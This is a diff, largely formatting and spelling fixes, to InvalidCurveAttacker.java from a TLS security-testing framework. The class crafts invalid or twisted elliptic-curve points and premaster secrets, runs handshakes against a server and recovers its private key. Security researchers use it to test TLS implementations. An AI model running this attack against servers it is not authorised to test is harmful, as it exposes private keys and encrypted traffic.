@@ -7,6 +7,7 @@
  * Licensed under Apache License 2.0
  * http://www.apache.org/licenses/LICENSE-2.0
  */
+
 package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
@@ -111,10 +112,11 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     public void executeAttack() {
         Config tlsConfig = getTlsConfig();
         LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
-                .name());
+            .name());
         EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
         RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
-        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
+        ICEAttacker attacker =
+            new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
                 tlsConfig.getDefaultSelectedNamedGroup());
         BigInteger result = attacker.attack();
         LOGGER.info("Resulting plain private key: {}", result);
@@ -131,7 +133,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     public Boolean isVulnerable() {
         if (!AlgorithmResolver.getKeyExchangeAlgorithm(getTlsConfig().getDefaultSelectedCipherSuite()).isEC()) {
             LOGGER.info("The CipherSuite that should be tested is not an Ec one:"
-                    + getTlsConfig().getDefaultSelectedCipherSuite().name());
+                + getTlsConfig().getDefaultSelectedCipherSuite().name());
             return null;
         }
         responsePairs = new LinkedList<>();
@@ -156,8 +158,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             point = Point.createPoint(transformedX, config.getPublicPointBaseY(), config.getNamedGroup());
         } else {
             curve = CurveFactory.getCurve(config.getNamedGroup());
-            point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
-                    config.getNamedGroup());
+            point =
+                Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(), config.getNamedGroup());
         }
 
         int protocolFlows = getConfig().getProtocolFlows();
@@ -168,8 +170,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         List<TlsTask> taskList = new LinkedList<>();
         for (int i = 1; i <= protocolFlows; i++) {
             setPremasterSecret(curve, i + config.getKeyOffset(), point);
-            InvalidCurveTask taskToAdd = new InvalidCurveTask(buildState(), executor.getReexecutions(), i
-                    + config.getKeyOffset());
+            InvalidCurveTask taskToAdd =
+                new InvalidCurveTask(buildState(), executor.getReexecutions(), i + config.getKeyOffset());
             taskList.add(taskToAdd);
         }
         executor.bulkExecuteTasks(taskList);
@@ -192,10 +194,11 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 premasterSecret = sharedPoint.getX().getData();
                 if (config.isCurveTwistAttack()) {
                     // transform back from simulated x-only ladder
-                    premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus()))
-                            .mod(curve.getModulus());
+                    premasterSecret =
+                        premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus())).mod(
+                            curve.getModulus());
                     if (config.getNamedGroup() == NamedGroup.ECDH_X25519
-                            || config.getNamedGroup() == NamedGroup.ECDH_X448) {
+                        || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                         // transform to Montgomery domain
                         RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                         Point weierPoint = rfcCurve.getPoint(premasterSecret, sharedPoint.getY().getData());
@@ -218,19 +221,21 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
-                new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
+        Point basepoint =
+            new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()), new FieldElementFp(
+                config.getPublicPointBaseY(), curve.getModulus()));
         byte[] serialized;
         if (curve instanceof RFC7748Curve) {
             serialized = ((RFC7748Curve) curve).encodeCoordinate(basepoint.getX().getData());
         } else {
-            serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint,
-                    config.getPointCompressionFormat());
+            serialized =
+                PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
         }
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(
-                ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
+        byte[] explicitPMS =
+            BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length,
+                premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
 
         WorkflowTrace trace;
@@ -251,21 +256,22 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     }
 
     private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
-            byte[] explicitPMS, Config individualConfig) {
+        byte[] explicitPMS, Config individualConfig) {
         if (individualConfig.getHighestProtocolVersion() != ProtocolVersion.TLS13) {
-            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCiphersuites()
-                    .get(0));
+            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites()
+                .get(0));
         }
-        WorkflowTrace trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(
-                WorkflowTraceType.HELLO, RunningModeType.CLIENT);
+        WorkflowTrace trace =
+            new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
+                RunningModeType.CLIENT);
         if (individualConfig.getHighestProtocolVersion().isTLS13()) {
 
             // replace specific receive action with generic
             trace.removeTlsAction(trace.getTlsActions().size() - 1);
             trace.addTlsAction(new GenericReceiveAction());
 
-            ClientHelloMessage cHello = (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(
-                    HandshakeMessageType.CLIENT_HELLO, trace);
+            ClientHelloMessage cHello =
+                (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(HandshakeMessageType.CLIENT_HELLO, trace);
             KeyShareExtensionMessage ksExt;
             for (ExtensionMessage ext : cHello.getExtensions()) {
                 if (ext instanceof KeyShareExtensionMessage) {
@@ -284,11 +290,12 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             individualConfig.setDefaultPreMasterSecret(explicitPMS);
         } else {
             trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(individualConfig),
-                    new ChangeCipherSpecMessage(individualConfig), new FinishedMessage(individualConfig)));
+                new ChangeCipherSpecMessage(individualConfig), new FinishedMessage(individualConfig)));
             trace.addTlsAction(new GenericReceiveAction());
 
-            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
-                    .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+            ECDHClientKeyExchangeMessage message =
+                (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
+                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
@@ -298,10 +305,11 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     }
 
     private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
-            byte[] explicitPMS, Config individualConfig) {
+        byte[] explicitPMS, Config individualConfig) {
         WorkflowTrace trace;
         if (individualConfig.getHighestProtocolVersion().isTLS13()) {
-            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
+            trace =
+                new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
                     RunningModeType.CLIENT);
             trace.addTlsAction(new ReceiveAction(ActionOption.CHECK_ONLY_EXPECTED, new NewSessionTicketMessage(false)));
             trace.addTlsAction(new ResetConnectionAction());
@@ -314,7 +322,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             // next ClientHello needs a PSKExtension
             individualConfig.setAddPreSharedKeyExtension(Boolean.TRUE);
 
-            WorkflowTrace secondHandshake = prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
+            WorkflowTrace secondHandshake =
+                prepareRegularTrace(serializedPublicKey, pms, explicitPMS, individualConfig);
 
             // subsequent ClientHellos don't need a PSKExtension
             individualConfig.setAddPreSharedKeyExtension(Boolean.FALSE);
@@ -328,11 +337,13 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 trace.addTlsAction(action);
             }
         } else {
-            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCiphersuites()
-                    .get(0));
-            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(
+            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites()
+                .get(0));
+            trace =
+                new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(
                     WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
-            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getLastSendMessage(
+            ECDHClientKeyExchangeMessage message =
+                (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getLastSendMessage(
                     HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
@@ -360,10 +371,10 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         } else {
             intendedCurve = (EllipticCurveOverFp) CurveFactory.getCurve(config.getNamedGroup());
         }
-        BigInteger modA = intendedCurve.getA().getData().multiply(config.getCurveTwistD().pow(2))
-                .mod(intendedCurve.getModulus());
-        BigInteger modB = intendedCurve.getB().getData().multiply(config.getCurveTwistD().pow(3))
-                .mod(intendedCurve.getModulus());
+        BigInteger modA =
+            intendedCurve.getA().getData().multiply(config.getCurveTwistD().pow(2)).mod(intendedCurve.getModulus());
+        BigInteger modB =
+            intendedCurve.getB().getData().multiply(config.getCurveTwistD().pow(3)).mod(intendedCurve.getModulus());
         EllipticCurveOverFp twistedCurve = new EllipticCurveOverFp(modA, modB, intendedCurve.getModulus());
         config.setTwistedCurve(twistedCurve);
         return twistedCurve;
@@ -373,41 +384,41 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         boolean foundExecutedAsPlanned = false;
         boolean foundServerFinished = false;
 
-        boolean tookKeyFromSuccessfullTrace = false;
-        boolean tookKeyFromUnsuccessfullTrace = false;
+        boolean tookKeyFromSuccessfulTrace = false;
+        boolean tookKeyFromUnsuccessfulTrace = false;
         for (TlsTask tlsTask : taskList) {
             InvalidCurveTask task = (InvalidCurveTask) tlsTask;
             WorkflowTrace trace = task.getState().getWorkflowTrace();
             if (!task.isHasError()) {
                 foundExecutedAsPlanned = true;
                 if (!(WorkflowTraceUtil.getLastReceivedMessage(trace) != null
-                        && WorkflowTraceUtil.getLastReceivedMessage(trace).isHandshakeMessage() && ((HandshakeMessage) WorkflowTraceUtil
-                            .getLastReceivedMessage(trace)).getHandshakeMessageType() == HandshakeMessageType.FINISHED)) {
+                    && WorkflowTraceUtil.getLastReceivedMessage(trace).isHandshakeMessage() && ((HandshakeMessage) WorkflowTraceUtil
+                        .getLastReceivedMessage(trace)).getHandshakeMessageType() == HandshakeMessageType.FINISHED)) {
                     LOGGER.info("Received no finished Message using secret" + task.getAppliedSecret());
                 } else {
                     LOGGER.info("Received a finished Message using secret: " + task.getAppliedSecret()
-                            + "! Server is vulnerable!");
+                        + "! Server is vulnerable!");
                     finishedKeys.add(task.getReceivedEcKey());
                     foundServerFinished = true;
                 }
 
                 if (task.getReceivedEcKey() != null) {
-                    tookKeyFromSuccessfullTrace = true;
+                    tookKeyFromSuccessfulTrace = true;
                     getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                 }
             } else {
                 if (task.getReceivedEcKey() != null) {
-                    tookKeyFromUnsuccessfullTrace = true;
+                    tookKeyFromUnsuccessfulTrace = true;
                     getReceivedEcPublicKeys().add(task.getReceivedEcKey());
                 }
             }
             responsePairs.add(new FingerprintSecretPair(task.getFingerprint(), task.getAppliedSecret()));
         }
 
-        if (config.isAttackInRenegotiation() && tookKeyFromSuccessfullTrace && tookKeyFromUnsuccessfullTrace) {
+        if (config.isAttackInRenegotiation() && tookKeyFromSuccessfulTrace && tookKeyFromUnsuccessfulTrace) {
             /*
-             * keys from an unsuccessfull trace might have been extracted from
-             * the first handshake of a renegotiation workflow trace - itcould*
+             * keys from an unsuccessful trace might have been extracted from
+             * the first handshake of a renegotiation workflow trace - it could*
              * be more probable that this is not the same TLS server as the
              * server, which answered the 2nd handshake while we can't ensure
              * that were talking to the same TLS server all the time anyway, it
@@ -445,7 +456,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     /**
      * @param responsePairs
-     *            the responsePairs to set
+     * the responsePairs to set
      */
     public void setResponsePairs(List<FingerprintSecretPair> responsePairs) {
         this.responsePairs = responsePairs;
